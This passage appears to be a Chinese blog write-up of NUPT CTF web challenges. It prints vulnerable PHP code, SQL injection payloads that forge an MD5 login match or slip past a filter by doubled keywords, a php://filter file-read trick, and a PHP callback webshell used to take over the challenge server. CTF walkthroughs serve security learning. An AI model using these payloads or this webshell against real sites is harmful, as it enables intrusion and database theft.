<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>($_POST[user] &amp;&amp; $_POST[pass]) {</span><br><span class="line">   mysql_connect(SAE_MYSQL_HOST_M . <span class="string">&apos;:&apos;</span> . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);</span><br><span class="line">  mysql_select_db(SAE_MYSQL_DB);</span><br><span class="line">  $user = $_POST[user];</span><br><span class="line">  $pass = md5($_POST[pass]);</span><br><span class="line">  $query = @mysql_fetch_array(mysql_query(<span class="string">&quot;select pw from ctf where user=&apos;$user&apos;&quot;</span>));</span><br><span class="line">  <span class="keyword">if</span> (($query[pw]) &amp;&amp; (!strcasecmp($pass, $query[pw]))) {</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Logged in! Key: ntcf{**************} &lt;/p&gt;&quot;</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">else</span> {</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&quot;&lt;p&gt;Log in failure!&lt;/p&gt;&quot;</span>);</span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>strcasecmp() &#x51FD;&#x6570;&#xFF1A;&#x6BD4;&#x8F83;&#x4E24;&#x4E2A;&#x5B57;&#x7B26;&#x4E32;&#xFF08;&#x4E0D;&#x533A;&#x5206;&#x5927;&#x5C0F;&#x5199;&#xFF09;</p>
<p>&#x7F3A;&#x9677;&#xFF1A;&#x540C; strcmp() &#x51FD;&#x6570;&#x4E00;&#x6837;&#xFF0C;&#x5904;&#x7406;&#x6570;&#x7EC4;&#x65F6;&#x8FD4;&#x56DE; NULL</p>
</blockquote>
<ol>
<li>&#x4F20;&#x5165; <code>$user</code> &#x548C; <code>$pass</code> &#xFF0C;&#x5C06; <code>$user</code> &#x5E26;&#x5165;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x67E5;&#x8BE2;&#x51FA;&#x5BF9;&#x5E94; <code>pw</code> &#x503C;&#xFF0C;&#x8981;&#x6C42;&#x67E5;&#x8BE2;&#x7ED3;&#x679C; <code>$query[pw]</code> &#x4E0D;&#x4E3A;&#x7A7A;</li>
<li>&#x5C06; MD5 &#x52A0;&#x5BC6;&#x540E;&#x7684; <code>$pass</code> &#x503C;&#x540C; <code>$query[pw]</code> &#x503C;&#x6BD4;&#x8F83;&#xFF0C;&#x76F8;&#x7B49;&#x5219;&#x8F93;&#x51FA; flag</li>
</ol>
<p>&#x539F;&#x672C;&#x6253;&#x7B97;&#x7EE7;&#x7EED;&#x5229;&#x7528; md5() &#x5904;&#x7406;&#x6570;&#x7EC4;&#x8FD4;&#x56DE; <code>NULL</code> &#xFF0C;&#x7EE7;&#x800C;&#x6784;&#x9020; SQL &#x8BED;&#x53E5;&#x67E5;&#x8BE2;&#x7ED3;&#x679C;&#x8FD4;&#x56DE; <code>&apos;NULL&apos;</code> &#x7ED5;&#x8FC7;&#x5224;&#x65AD;&#xFF0C;&#x53EF;&#x60DC; <code>strcasecmp()</code> &#x4E0D;&#x8BA4;&#x8FD9;&#x4FE9;&#x5144;&#x561A;</p>
<p><img src="/2019/09/26/&#x5357;&#x90AE;-CTF-&#x5E73;&#x53F0;&#x9898;&#x8BB0;/sql201.png" alt="1569068932948"> </p>
<p>&#x5F00;&#x59CB;&#x5C1D;&#x8BD5;&#x6784;&#x9020;&#x8BED;&#x53E5;&#x63A7;&#x5236;&#x6570;&#x636E;&#x5E93;&#x67E5;&#x8BE2;&#x8FD4;&#x56DE;&#x503C;&#xFF1A;</p>
<p><img src="/2019/09/26/&#x5357;&#x90AE;-CTF-&#x5E73;&#x53F0;&#x9898;&#x8BB0;/sql202.png" alt="1569067991378"></p>
<p>&#x5C1D;&#x8BD5;&#x4F7F;&#x7528; <code>sleep()</code> &#x51FD;&#x6570;&#x6D4B;&#x8BD5; union &#x67E5;&#x8BE2;&#x5217;&#x6570;&#xFF0C;&#x786E;&#x5B9A;&#x5217;&#x6570;&#x4E3A; 1&#x3002;</p>
<p>&#x81F3;&#x6B64;&#x5DF2;&#x7ECF;&#x53EF;&#x4EE5;&#x63A7;&#x5236; <code>$query[pw]</code> &#x548C; <code>$pass</code> &#x7684;&#x503C;&#x4E86;&#xFF0C;&#x6784;&#x9020; payload &#x4F7F;&#x5176;&#x76F8;&#x7B49;&#x5373;&#x53EF;&#x83B7;&#x53D6; flag</p>
<p>e.g.</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user=1&apos; union <span class="keyword">select</span> <span class="string">&apos;63a9f0ea7bb98050796b649e85481845&amp;pass=root</span></span><br></pre></td></tr></table></figure>

<h3 id="1-31-&#x7EFC;&#x5408;&#x9898;2"><a href="#1-31-&#x7EFC;&#x5408;&#x9898;2" class="headerlink" title="1.31 &#x7EFC;&#x5408;&#x9898;2"></a>1.31 &#x7EFC;&#x5408;&#x9898;2</h3><p>&#x4F53;&#x91CF;&#x8F83;&#x5927;&#xFF0C;&#x5C31;&#x8BB0;&#x5F55;&#x5927;&#x81F4;&#x6D41;&#x7A0B;&#x5427;</p>
<h5 id="1-31-1-&#x4FE1;&#x606F;&#x6536;&#x96C6;"><a href="#1-31-1-&#x4FE1;&#x606F;&#x6536;&#x96C6;" class="headerlink" title="1.31.1 &#x4FE1;&#x606F;&#x6536;&#x96C6;"></a>1.31.1 &#x4FE1;&#x606F;&#x6536;&#x96C6;</h5><p>&#x7C97;&#x7F06;&#x7AD9;&#x70B9;&#xFF0C;&#x6709;&#x51E0;&#x4E2A;&#x5F15;&#x8D77;&#x6CE8;&#x610F;&#x7684;&#x70B9;&#xFF1A;</p>
<ol>
<li>&#x4E24;&#x5904;&#x7F16;&#x7801;&#xFF08;&#x540E;&#x7ECF;&#x89E3;&#x5BC6;&#x771F;&#x7684;&#x53EA;&#x662F; QQ &#x53F7;&#x3002;&#x3002;&#x3002;</li>
<li>&#x7559;&#x8A00;&#x641C;&#x7D22;&#x8BA4;&#x8BC1;&#x4E86;&#x6D4F;&#x89C8;&#x5668;</li>
<li>&#x7559;&#x8A00;&#x529F;&#x80FD;&#x63D0;&#x793A;&#xFF1A; xss &#x4E0D;&#x4FDD;&#x8BC1;&#x53EF;&#x4EE5;&#x6210;&#x529F;&#x3001;&#x6635;&#x79F0;&#x6216;&#x7559;&#x8A00;&#x5185;&#x5BB9;&#x4E0D;&#x80FD;&#x4E3A;&#x7A7A;&#x3001;&#x67E5;&#x770B;&#x9875;&#x9762;&#x6E90;&#x7801;</li>
<li><code>about.php</code> &#x63D0;&#x4F9B;&#x4E86;&#x5927;&#x91CF;&#x7AD9;&#x70B9;&#x9875;&#x9762;&#x4FE1;&#x606F;&#xFF0C;&#x7ED9;&#x51FA;&#x4E86; admin &#x8868;&#x7ED3;&#x6784;&#xFF08;&#x6000;&#x7591;&#x9700;&#x5229;&#x7528; SQL &#x6CE8;&#x5165;&#x6F0F;&#x6D1E;&#xFF09;</li>
</ol>
<h5 id="1-31-2-&#x529F;&#x80FD;&#x6D4B;&#x8BD5;"><a href="#1-31-2-&#x529F;&#x80FD;&#x6D4B;&#x8BD5;" class="headerlink" title="1.31.2 &#x529F;&#x80FD;&#x6D4B;&#x8BD5;"></a>1.31.2 &#x529F;&#x80FD;&#x6D4B;&#x8BD5;</h5><p>&#x7ED3;&#x5408; &#x2462; &#x5904;&#x63D0;&#x793A;&#xFF0C;&#x9996;&#x5148;&#x6D4B;&#x5F97; <code>about.php</code> &#x9875;&#x9762;&#x5B58;&#x5728;&#x6587;&#x4EF6;&#x8BFB;&#x53D6;&#x6F0F;&#x6D1E;&#xFF0C;&#x5229;&#x7528; <code>php://filter/read=convert.base64-encode/resource=xx.php</code> &#x8BFB;&#x53D6;&#x4E86;&#x4EE5;&#x4E0B;&#x6587;&#x4EF6;&#x6E90;&#x7801; :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#x4E3B;&#x9875;&#x6587;&#x4EF6;&#xFF1A;	index.php</span><br><span class="line">&#x52A0;&#x5BC6;&#x7B97;&#x6CD5;&#xFF1A;	passencode.php</span><br><span class="line">&#x641C;&#x7D22;&#x7559;&#x8A00;&#xFF1A;	so.php</span><br><span class="line">&#x9884;&#x89C8;&#x7559;&#x8A00;&#xFF1A;	preview.php</span><br><span class="line">&#x63D0;&#x4EA4;&#x7559;&#x8A00;&#xFF1A;	say.php</span><br><span class="line">&#x7F51;&#x7AD9;&#x8BF4;&#x660E;&#xFF1A;	about.php</span><br></pre></td></tr></table></figure>

<p>&#x5C1D;&#x8BD5;&#x8BFB;&#x53D6; <code>config.php</code> &#x65F6;&#x5F02;&#x5E38;&#xFF0C;&#x5B9A;&#x4F4D;&#x5230; <code>about.php</code> &#xFF1A;</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- about.php --&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">$file=$_GET[&apos;file&apos;];</span><br><span class="line">if($file==&quot;&quot; || strstr($file,&apos;config.php&apos;)){</span><br><span class="line">echo &quot;file&#x53C2;&#x6570;&#x4E0D;&#x80FD;&#x4E3A;&#x7A7A;&#xFF01;&quot;;</span><br><span class="line">exit();</span><br><span class="line">}else{</span><br><span class="line">$cut=strchr($file,&quot;loginxlcteam&quot;);</span><br><span class="line">if($cut==false){</span><br><span class="line">$data=file_get_contents($file);</span><br><span class="line">$date=htmlspecialchars($data);</span><br><span class="line">echo $date;</span><br><span class="line">}else{</span><br><span class="line">echo &quot;&lt;script&gt;alert(&apos;&#x654F;&#x611F;&#x76EE;&#x5F55;&#xFF0C;&#x7981;&#x6B62;&#x67E5;&#x770B;&#xFF01;&#x4F46;&#x662F;&#x3002;&#x3002;&#x3002;&apos;)&lt;/script&gt;&quot;;</span><br><span class="line">}</span><br><span class="line">}</span><br></pre></td></tr></table></figure>

<p><code>$file</code> &#x4E2D;&#x7981;&#x6B62;&#x51FA;&#x73B0; <code>config.php</code> &#xFF0C;&#x540E;&#x9762;&#x53C8;&#x5BF9; <code>loginxlcteam</code> &#x505A;&#x4E86;&#x9650;&#x5236;&#xFF0C;&#x5E76;&#x63D0;&#x793A; <code>&#x654F;&#x611F;&#x76EE;&#x5F55;&#xFF0C;&#x7981;&#x6B62;&#x67E5;&#x770B;&#xFF01;&#x4F46;&#x662F;&#x3002;&#x3002;&#x3002;</code></p>
<p>&#x8BBF;&#x95EE; <code>loginxlcteam</code> &#x76EE;&#x5F55;&#xFF0C;&#x83B7;&#x5F97;&#x540E;&#x53F0;&#x767B;&#x9646;&#x5730;&#x5740; <code>/loginxlcteam/index.php</code>&#x3002;&#x6D4B;&#x8BD5;&#x767B;&#x9646;&#x6846;&#x6CE8;&#x5165;&#x65F6;&#xFF0C;&#x53D1;&#x73B0;&#x767B;&#x9646;&#x62A5;&#x9519;&#x4FE1;&#x606F;&#x5F88;&#x8BE6;&#x7EC6;&#xFF0C;&#x5E76;&#x786E;&#x8BA4;&#x7528;&#x6237; <code>admin</code> &#x5B58;&#x5728;&#x3002;&#x5C1D;&#x8BD5;&#x7206;&#x7834;&#x5BC6;&#x7801;&#x65F6;&#xFF0C;&#x89C9;&#x5F97;&#x62A5;&#x9519;&#x4FE1;&#x606F;&#x5B58;&#x5728;&#x9519;&#x8BEF;&#x5F15;&#x5BFC;&#xFF0C;&#x9042;&#x5F00;&#x59CB;&#x4EE3;&#x7801;&#x5BA1;&#x8BA1;&#x5BFB;&#x627E; SQL &#x6CE8;&#x5165;&#x5229;&#x7528;&#x70B9;&#x3002;</p>
<p>&#x5728;&#x4EE3;&#x7801;&#x5BA1;&#x8BA1;&#x8FC7;&#x7A0B;&#x4E2D;&#xFF0C;&#x53C8;&#x53D1;&#x73B0;&#x4EE5;&#x4E0B;&#x4E24;&#x4E2A;&#x6587;&#x4EF6;&#xFF1A;</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SQL &#x8FC7;&#x6EE4;&#x6587;&#x4EF6;&#xFF1A;	antiinject.php</span><br><span class="line">XSS &#x8FC7;&#x6EE4;&#x6587;&#x4EF6;&#xFF1A;	antixss.php</span><br></pre></td></tr></table></figure>

<p>&#x5B9A;&#x4F4D;&#x5230; SQL &#x6CE8;&#x5165;&#x8FC7;&#x6EE4;&#x6587;&#x4EF6; <code>antiinject.php</code> &#xFF1A;</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- antiinject.php --&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">function antiinject($content){</span><br><span class="line">$keyword=array(&quot;select&quot;,&quot;union&quot;,&quot;and&quot;,&quot;from&quot;,&apos; &apos;,&quot;&apos;&quot;,&quot;;&quot;,&apos;&quot;&apos;,&quot;char&quot;,&quot;or&quot;,&quot;count&quot;,&quot;master&quot;,&quot;name&quot;,&quot;pass&quot;,&quot;admin&quot;,&quot;+&quot;,&quot;-&quot;,&quot;order&quot;,&quot;=&quot;);</span><br><span class="line">$info=strtolower($content);</span><br><span class="line">for($i=0;$i&lt;=count($keyword);$i++){</span><br><span class="line"> $info=str_replace($keyword[$i], &apos;&apos;,$info);</span><br><span class="line">}</span><br><span class="line">return $info;</span><br><span class="line">}</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><code>antiinject()</code> &#x51FD;&#x6570;&#x904D;&#x5386; <code>$keyword</code> &#x6570;&#x7EC4;&#xFF0C;&#x5C06; <code>$content</code> &#x53C2;&#x6570;&#x4E2D;&#x7684;&#x654F;&#x611F;&#x5173;&#x952E;&#x5B57;&#x66FF;&#x6362;&#x4E3A;&#x7A7A;&#x3002;&#x4F46;&#x5BF9;&#x76F8;&#x5173;&#x5173;&#x952E;&#x5B57;&#x7684;&#x5254;&#x9664;&#x53EA;&#x505A;&#x4E86;&#x4E00;&#x904D;&#xFF0C;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x53CC;&#x5199;&#x7ED5;&#x8FC7;&#x3002;</p>
<p>e.g.</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">or  	-&gt;	oorr</span><br><span class="line">order	-&gt;	oorrdoorrderer</span><br><span class="line">union	-&gt;	uniunionon</span><br><span class="line"><span class="keyword">select</span>	-&gt;	selselectect</span><br><span class="line"><span class="keyword">from</span>	-&gt;	frfromom</span><br><span class="line"><span class="keyword">admin</span>	-&gt;	adadminmin</span><br><span class="line">pass	-&gt;	papassss</span><br><span class="line"><span class="keyword">name</span>	-&gt;	nanameme</span><br></pre></td></tr></table></figure>

<p>&#x5BFB;&#x627E;&#x56DE;&#x663E;&#x65F6;&#xFF0C;&#x6CE8;&#x610F;&#x5230;&#x7559;&#x8A00;&#x641C;&#x7D22;&#x9875;&#x9762; <code>so.php</code> &#x901A;&#x8FC7; <code>$id</code> &#x67E5;&#x8BE2;&#x6570;&#x636E;&#x5E76;&#x6709;&#x56DE;&#x663E;</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- so.php --&gt;</span><br><span class="line">&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;</span><br><span class="line">&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;</span><br><span class="line">&lt;title&gt;&#x641C;&#x7D22;&#x7559;&#x8A00;&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;center&gt;</span><br><span class="line">&lt;div id=&quot;say&quot; name=&quot;say&quot; align=&quot;left&quot; style=&quot;width:1024px&quot;&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">if($_SERVER[&apos;HTTP_USER_AGENT&apos;]!=&quot;Xlcteam Browser&quot;){</span><br><span class="line">echo &apos;&#x4E07;&#x6076;&#x6EF4;&#x9ED1;&#x9614;&#xFF0C;&#x672C;&#x529F;&#x80FD;&#x53EA;&#x6709;&#x7528;&#x672C;&#x516C;&#x53F8;&#x5F00;&#x53D1;&#x7684;&#x6D4F;&#x89C8;&#x5668;&#x624D;&#x53EF;&#x4EE5;&#x7528;&#x5594;~&apos;;</span><br><span class="line">    exit();</span><br><span class="line">}</span><br><span class="line">$id=$_POST[&apos;soid&apos;];</span><br><span class="line">include &apos;config.php&apos;;</span><br><span class="line">include &apos;antiinject.php&apos;;</span><br><span class="line">include &apos;antixss.php&apos;;</span><br><span class="line">$id=antiinject($id);</span><br><span class="line">$con = mysql_connect($db_address,$db_user,$db_pass) or die(&quot;&#x4E0D;&#x80FD;&#x8FDE;&#x63A5;&#x5230;&#x6570;&#x636E;&#x5E93;&#xFF01;&#xFF01;&quot;.mysql_error());</span><br><span class="line">mysql_select_db($db_name,$con);</span><br><span class="line">$id=mysql_real_escape_string($id);</span><br><span class="line">$result=mysql_query(&quot;SELECT * FROM `message` WHERE display=1 AND id=$id&quot;);</span><br><span class="line">$rs=mysql_fetch_array($result);</span><br><span class="line">echo htmlspecialchars($rs[&apos;nice&apos;]).&apos;:&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&apos;.antixss($rs[&apos;say&apos;]).&apos;&lt;br /&gt;&apos;;</span><br><span class="line">mysql_free_result($result);</span><br><span class="line">mysql_free_result($file);</span><br><span class="line">mysql_close($con);</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/center&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p> <code>$_SERVER[&apos;HTTP_USER_AGENT&apos;]</code> &#x901A;&#x8FC7; UA &#x6821;&#x9A8C;&#xFF0C;&#x4E8E;&#x662F;&#x6784;&#x9020; <code>User-Agent: Xlcteam Browser</code> &#x91CD;&#x65B0;&#x8BF7;&#x6C42; <code>so.php</code></p>
<p><img src="/2019/09/26/&#x5357;&#x90AE;-CTF-&#x5E73;&#x53F0;&#x9898;&#x8BB0;/zh201.png" alt="1569217787403"></p>
<p><code>$soid=1</code> &#x65F6;&#x65E0;&#x56DE;&#x663E;&#xFF08; <code>-</code> &#x53F7;&#x88AB;&#x8FC7;&#x6EE4;&#x4E86;&#xFF0C;&#x540E;&#x9762;&#x5229;&#x7528; <code>$soid=1</code> &#x663E;&#x793A;&#x6570;&#x636E;&#xFF1B;&#x5229;&#x7528; <code>like | in</code> &#x66FF;&#x6362; <code>=</code>&#xFF09;</p>
<p><code>so.php</code> &#x5BF9;&#x4F20;&#x5165;&#x53C2;&#x6570; <code>$_POST[&apos;soid&apos;]</code> &#x7684;&#x64CD;&#x4F5C;&#x6D41;&#xFF1A;</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt; $id=$_POST[<span class="string">&apos;soid&apos;</span>];</span><br><span class="line">		...</span><br><span class="line">&gt; <span class="keyword">include</span> <span class="string">&apos;antiinject.php&apos;</span>;</span><br><span class="line">&gt; $id=antiinject($id);</span><br><span class="line">		...</span><br><span class="line">&gt; $id=mysql_real_escape_string($id);</span><br><span class="line">&gt; $result=mysql_query(<span class="string">&quot;SELECT * FROM `message` WHERE display=1 AND id=$id&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>&#x5206;&#x522B;&#x7ECF;&#x8FC7;&#x4E86; <code>antiinject()</code> &#x548C; <code>mysql_real_escape_string()</code> &#x51FD;&#x6570;&#x7684;&#x8FC7;&#x6EE4;&#x3002;</p>
<blockquote>
<p>mysql_real_escape_string()&#xFF1A;</p>
<p>&#x200B;    &#x8981;&#x8F6C;&#x4E49;&#x7684;&#x5B57;&#x7B26;&#x4E32;&#xFF1A;&#x7F16;&#x7801;&#x7684;&#x5B57;&#x7B26;&#x662F; NUL&#xFF08;ASCII 0&#xFF09;&#x3001;\n&#x3001;\r&#x3001;\&#x3001;&#x2019;&#x3001;&#x201D; &#x548C; Control-Z</p>
</blockquote>
<p>&#x8FD9;&#x91CC;&#x4E3A;&#x6570;&#x5B57;&#x578B;&#x6CE8;&#x5165;&#xFF0C;&#x4E0D;&#x9700;&#x4F7F;&#x7528;&#x5355;&#x5F15;&#x53F7;&#xFF08;&#x8868;&#x540D; <code>admin</code> &#x53EF;&#x4EE5;&#x7528; <code>0x61646d696e</code> &#x66FF;&#x4EE3;&#xFF09;&#xFF0C;&#x6545;&#x53EF;&#x4EE5;&#x5FFD;&#x7565;&#x3002;&#x9700;&#x8981;&#x4F7F;&#x7528;&#x5355;&#x5F15;&#x53F7;&#x65F6;&#xFF0C;&#x53EF;&#x4EE5;&#x5C1D;&#x8BD5;&#x4E00;&#x4E0B;&#x5BBD;&#x5B57;&#x8282;&#x6CE8;&#x5165;&#x3002;&#xFF08;&#x63A8;&#x8350; P&#x725B; &#x4E00;&#x7BC7;&#x535A;&#x6587;&#xFF1A;<a href="https://www.leavesongs.com/PENETRATION/mutibyte-sql-inject.html" target="_blank" rel="noopener">&#x6D45;&#x6790;&#x767D;&#x76D2;&#x5BA1;&#x8BA1;&#x4E2D;&#x7684;&#x5B57;&#x7B26;&#x7F16;&#x7801;&#x53CA;SQL&#x6CE8;&#x5165;</a>&#xFF09;</p>
<p><code>about.php</code> &#x4E2D;&#x7ED9;&#x51FA;&#x4E86; <code>admin</code> &#x8868;&#x7684;&#x7ED3;&#x6784;&#xFF0C;&#x56E0;&#x6B64;&#x53EA;&#x9700;&#x518D;&#x83B7;&#x53D6;&#x5230;&#x5B57;&#x6BB5;&#x6570;&#x5C31;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x67E5;&#x8BE2; <code>userpass</code> &#x4E86;&#x3002;</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># &#x83B7;&#x53D6;&#x5B57;&#x6BB5;&#x6570;</span></span><br><span class="line">soid=2<span class="comment">/**/</span>oorrdoorrderer<span class="comment">/**/</span>by<span class="comment">/**/</span>4</span><br><span class="line"></span><br><span class="line"><span class="comment"># &#x83B7;&#x53D6;&#x663E;&#x793A;&#x4F4D;</span></span><br><span class="line">soid=1<span class="comment">/**/</span>uniunionon<span class="comment">/**/</span>selselectect<span class="comment">/**/</span>1,2,3,4</span><br><span class="line"></span><br><span class="line"><span class="comment"># &#x8FD4;&#x56DE;&#x52A0;&#x5BC6;&#x5BC6;&#x7801;</span></span><br><span class="line">soid=1<span class="comment">/**/</span>uniunionon<span class="comment">/**/</span>selselectect<span class="comment">/**/</span>1,2,userpapassss,4<span class="comment">/**/</span>frfromom<span class="comment">/**/</span>adadminmin<span class="comment">/**/</span>where<span class="comment">/**/</span>usernanameme<span class="comment">/**/</span>like<span class="comment">/**/</span>(0x61646d696e)</span><br></pre></td></tr></table></figure>

<p>&#x5BC6;&#x7801;&#xFF1A;<code>102 117 99 107 114 117 110 116 117</code></p>
<p>&#x67E5;&#x770B;&#x52A0;&#x5BC6;&#x7B97;&#x6CD5; <code>passencode.php</code> &#xFF1A;</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- passencode.php --&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">function passencode($content){</span><br><span class="line">//$pass=urlencode($content);</span><br><span class="line">$array=str_split($content);</span><br><span class="line">$pass=&quot;&quot;;</span><br><span class="line">for($i=0;$i&lt;count($array);$i++){</span><br><span class="line">if($pass!=&quot;&quot;){</span><br><span class="line">$pass=$pass.&quot; &quot;.(string)ord($array[$i]);</span><br><span class="line">}else{</span><br><span class="line">$pass=(string)ord($array[$i]);</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line">return $pass;</span><br><span class="line">}</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>&#x4F7F;&#x7528;&#x4E86; <code>ASCII</code> &#x8F6C;&#x7801;&#x8868;&#x793A;&#xFF0C;&#x89E3;&#x5BC6;&#x540E;&#x771F;&#x5B9E;&#x5BC6;&#x7801;&#xFF1A;<code>fuckruntu</code> </p>
<p>&#x767B;&#x9646;&#x540E;&#x53F0;&#xFF1A;</p>
<p><img src="/2019/09/26/&#x5357;&#x90AE;-CTF-&#x5E73;&#x53F0;&#x9898;&#x8BB0;/zh202.png" alt="1569221647915"></p>
<p>&#x8BFB;&#x53D6; <code>xlcteam.php</code> &#x6E90;&#x7801;&#xFF1A;</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$e = $_REQUEST[<span class="string">&apos;www&apos;</span>];</span><br><span class="line">$arr = <span class="keyword">array</span>($_POST[<span class="string">&apos;wtf&apos;</span>] =&gt; <span class="string">&apos;|.*|e&apos;</span>,);</span><br><span class="line">array_walk($arr, $e, <span class="string">&apos;&apos;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>&#x56DE;&#x8C03;&#x9A6C;&#xFF08;<a href="https://blog.csdn.net/u014549283/article/details/81842084" target="_blank" rel="noopener">webshell&#x56DE;&#x8C03;php&#x603B;&#x7ED3;</a>&#xFF09;</p>
<p>&#x8FDE;&#x63A5;&#x4E00;&#x53E5;&#x8BDD;</p>
<p><img src="/2019/09/26/&#x5357;&#x90AE;-CTF-&#x5E73;&#x53F0;&#x9898;&#x8BB0;/zh203.png" alt="1569222114080"></p>
<h5 id="1-31-3-&#x5C0F;&#x7ED3;"><a href="#1-31-3-&#x5C0F;&#x7ED3;" class="headerlink" title="1.31.3 &#x5C0F;&#x7ED3;"></a>1.31.3 &#x5C0F;&#x7ED3;</h5><p><img src="/2019/09/26/&#x5357;&#x90AE;-CTF-&#x5E73;&#x53F0;&#x9898;&#x8BB0;/zh204.png" alt="1569222720268"></p>
<p>&#x5E08;&#x5085;&#x8F9B;&#x82E6;&#x4E86;&#x3002;&#x3002;&#xFF08;&#xFF1A;&#x9003;</p>
